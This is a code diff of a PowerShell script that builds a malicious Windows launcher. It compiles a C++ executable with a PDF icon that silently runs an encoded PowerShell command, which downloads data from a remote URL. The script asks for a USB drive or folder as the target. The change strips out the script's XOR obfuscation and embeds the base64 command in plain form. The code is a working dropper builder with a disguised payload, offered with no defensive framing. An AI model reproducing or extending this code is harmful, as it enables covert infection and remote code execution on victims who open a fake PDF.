@@ -7,16 +7,7 @@ $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseein
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
 $encCmd = [Convert]::ToBase64String($encBytes)
 
-# XOR-obfuscate the base64 command for the launcher binary (no null bytes in output)
-$cmdBytes = [System.Text.Encoding]::UTF8.GetBytes($encCmd)
-do {
-    $xorKey = @()
-    for ($i = 0; $i -lt 32; $i++) { $xorKey += (Get-Random -Min 0 -Max 256) }
-    $xored = @()
-    for ($i = 0; $i -lt $cmdBytes.Length; $i++) { $xored += $cmdBytes[$i] -bxor $xorKey[$i % 32] }
-} while ($xored -contains 0)
-$keyArr = ($xorKey | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
-$encArr = ($xored | ForEach-Object { "0x{0:x2}" -f $_ }) -join ", "
+# Keep $encCmd for Run.bat; launcher gets the plain command
 
 if (!$Path) {
     $Path = Read-Host "Enter target path (USB drive or folder)"
@@ -51,12 +42,7 @@ Set-Content "$tmpDir\launcher.rc" '101 ICON "pdf.ico"' -Encoding Ascii
 # --- Create launcher.cpp ---
 $cpp = '#include <windows.h>'
 $cpp += "`r`nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {"
-$cpp += "`r`n    unsigned char enc[] = { $encArr };"
-$cpp += "`r`n    unsigned char key[] = { $keyArr };"
-$cpp += "`r`n    char dec[sizeof(enc)+1] = {0};"
-$cpp += "`r`n    for (int i = 0; i < (int)sizeof(enc); i++)"
-$cpp += "`r`n        dec[i] = enc[i] ^ key[i % 32];"
-$cpp += "`r`n    WinExec(dec, SW_HIDE);"
+$cpp += "`r`n    WinExec(`"powershell -w h -Enc $encCmd`", SW_HIDE);"
 $cpp += "`r`n    return 0;"
 $cpp += "`r`n}"
 Set-Content "$tmpDir\launcher.cpp" $cpp -Encoding Ascii
